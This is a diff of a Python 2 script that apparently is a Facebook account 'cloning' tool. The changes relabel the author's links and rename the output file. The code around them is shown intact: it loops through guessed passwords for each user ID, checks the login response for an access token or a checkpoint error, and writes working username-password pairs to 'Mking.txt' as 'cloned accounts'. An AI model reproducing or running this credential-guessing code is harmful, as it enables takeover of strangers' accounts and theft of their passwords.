@@ -82,14 +82,14 @@ Mking_youtube = random.choice(["https://youtube.com/channel/UCf1GQX6XsLv46xeUfo_
 youtuber = Mking_youtube
  
 def youtube():
-	Style_profaisor("  please Follow My Page author :) Thank you")
-	os.system("xdg-open https://www.facebook.com/4FR1D1.143")
+	Style_profaisor("  please Follow My Fb account author :) Thank you")
+	os.system("xdg-open https://www.facebook.com/profile.php?id=100006267764888")
 	menu()
 	
 #MY TELEGRAM GROUp
  
 def telegram():
-	Style_profaisor("  please Join My Grope :) Thank you")
+	Style_profaisor("  please Join My FB Grope :) Thank you")
 	os.system("xdg-open https://www.facebook.com/groups/890374404870466/?ref=share")
 	
 	
@@ -112,9 +112,9 @@ logo ="""
 \033[1;91m......##.....##...##\033[1;0m
 \033[1;97m.....##......##..#######\033[1;0m
 \033[1;97m--------------------------------------------------
-\033[1;91m Author      :  Emranoo Aadil
-\033[1;91m GitHub      : https://github.com/aadilafg001
-\033[1;91m Facrbook     : https://www.facebook.com/hamza.aadil.391
+\033[1;91m Author       :  Emranoo Aadil
+\033[1;91m GitHub       : https://github.com/aadilafg001
+\033[1;91m Facebook  : https://www.facebook.com/hamza.aadil.391
 \033[1;91m 
 \033[1;91m 
 \033[1;97m--------------------------------------------------
@@ -199,13 +199,13 @@ def Select_menu():
             q = json.load(data)
             if 'access_token' in q:
                 print ' \x1b[1;92m[Emran Aadil_OK] ' + k + c + user + ' | ' + pass1
-                okb = open('Mking.txt', 'a')
+                okb = open(' Mking.txt', 'a')
                 okb.write(k + c + user + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
                 print ' \x1b[1;93m[Emran aadil_CP] ' + k + c + user + ' | ' + pass1
-                cps = open('Emran aadil.txt', 'a')
+                cps = open('Mking.txt', 'a')
                 cps.write(k + c + user + pass1 + '\n')
                 cps.close()
                 cpb.append(c + user + pass1)
@@ -215,13 +215,13 @@ def Select_menu():
                 q = json.load(data)
                 if 'access_token' in q:
                     print ' \x1b[1;92m[Emran Aadil_OK] ' + k + c + user + ' | ' + pass2
-                    okb = open('Emran Aadil.txt', 'a')
+                    okb = open('Mking.txt', 'a')
                     okb.write(k + c + user + pass2 + '\n')
                     okb.close()
                     oks.append(c + user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
                     print ' \x1b[1;93m[Emran Aadil_CP] ' + k + c + user + ' | ' + pass2
-                    cps = open('Emran Aadil.txt', 'a')
+                    cps = open('Mking', 'a')
                     cps.write(k + c + user + pass2 + '\n')
                     cps.close()
                     cpb.append(c + user + pass2)
@@ -231,13 +231,13 @@ def Select_menu():
                     q = json.load(data)
                     if 'access_token' in q:
                         print ' \x1b[1;92m[Emran Aadil_OK] ' + k + c + user + ' | ' + pass3
-                        okb = open('Emran Aadil.txt', 'a')
+                        okb = open('Mking.txt', 'a')
                         okb.write(k + c + user + pass3 + '\n')
                         okb.close()
                         oks.append(c + user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
                         print ' \x1b[1;93m[MKING_CP] ' + k + c + user + ' | ' + pass3
-                        cps = open('Emran Aadil.txt', 'a')
+                        cps = open('Mking.txt', 'a')
                         cps.write(k + c + user + pass3 + '\n')
                         cps.close()
                         cpb.append(c + user + pass3)
@@ -247,7 +247,7 @@ def Select_menu():
                         q = json.load(data)
                         if 'access_token' in q:
                             print ' \x1b[1;92m[Emran Aadil_OK] ' + k + c + user + ' | ' + pass4
-                            okb = open('Emran Aafil.txt', 'a')
+                            okb = open('Mking.txt', 'a')
                             okb.write(k + c + user + pass4 + '\n')
                             okb.close()
                             oks.append(c + user + pass4)
@@ -263,13 +263,13 @@ def Select_menu():
                             q = json.load(data)
                             if 'access_token' in q:
                                 print ' \x1b[1;92m[Emran Aadil_OK] ' + k + c + user + ' | ' + pass5
-                                okb = open('Emran Aadil.txt', 'a')
+                                okb = open('Mking.txt', 'a')
                                 okb.write(k + c + user + pass5 + '\n')
                                 okb.close()
                                 oks.append(c + user + pass5)
                             elif 'www.facebook.com' in q['error_msg']:
                                 print ' \x1b[1;93m[Emran Aadil_CP] ' + k + c + user + ' | ' + pass5
-                                cps = open('Emran Aadil.txt', 'a')
+                                cps = open('Mking.txt', 'a')
                                 cps.write(k + c + user + pass5 + '\n')
                                 cps.close()
                                 cpb.append(c + user + pass5)
@@ -283,7 +283,7 @@ def Select_menu():
     print 54 * '\x1b[1;92m_'
     print ' \x1b[1;92mThe Process has been Completed ...'
     print ' \x1b[1;92mTotal Ok/Cp : ' + str(len(oks)) + '/' + str(len(cpb))
-    print ' Cloned Accounts Has Been Saved : Emran Aadil.txt'
+    print ' Cloned Accounts Has Been Saved : Mking.txt'
     print ' Note : Cp accounts Will Open after 8/10 days'
     print 54 * '\x1b[1;92m_'
     print ''
